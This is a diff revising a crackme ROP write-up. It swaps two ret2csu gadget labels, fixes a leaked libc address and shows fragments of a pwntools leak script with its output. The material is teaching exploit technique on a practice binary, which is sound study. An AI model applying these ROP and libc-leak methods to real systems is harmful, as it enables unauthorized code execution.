@@ -243,12 +243,6 @@ Disassembly of section .fini:
 Hiding in here are 2 beautiful gadgets, at address `0x40060a` and `0x4005f0` respectively. Giving us the reusable pieces of code:
 ```
 // Gadget 1 at 0x40060a
-mov    %r15,%rdx
-mov    %r14,%rsi
-ov    %r13d,%edi
-call   *(%r12,%rbx,8)
-
-// Gadget 2 at 0x4005f0
 pop    %rbx
 pop    %rbp
 pop    %r12
@@ -256,6 +250,12 @@ pop    %r13
 pop    %r14
 pop    %r15
 ret
+
+// Gadget 2 at 0x4005f0
+mov    %r15,%rdx
+mov    %r14,%rsi
+ov    %r13d,%edi
+call   *(%r12,%rbx,8)
 ```
 For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the registers via the pop sequence, and gadget 2 at 0x4005f0 to execute the call. These are the results:
 ```
@@ -272,7 +272,7 @@ For my leak script, I used both gadgets. Gadget 1 at `0x40060a` to load the regi
 Leaked (8 bytes): e0ddd07f027f0000
 [*] Stopped process './rop' (pid 23912)
 ```
-Now that is the leaked value, but we need to translate that to a real usable address. For that I made another little script.
+Now that is the leaked value, but we need to translate these raw bytes to a real usable address. For that I made another little script.
 ```
 from pwn import *
 leaked = bytes.fromhex('e0ddd07f027f0000')
@@ -283,7 +283,7 @@ print(hex(write_libc))
 ❯ python translate_libc.py
 0x7f027fd0dde0
 ```
-Amazing! Our libc address is `0xe0ddd07f027f0000`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
+Amazing! Our libc address is `0x7f027fd0dde0`! Now, this only proves our exploit so far works, because this address is different every runtime as libc does not live inside our binary. Because of this, the entire script will have to be a single big exploit doing all steps at once. Every function inside of libc lives at a fixed offset of our libc address, which never changes within a given libc version.
 ```
 ~/Projects/RE/crackmes.one/rop
 ❯ ldd ./rop
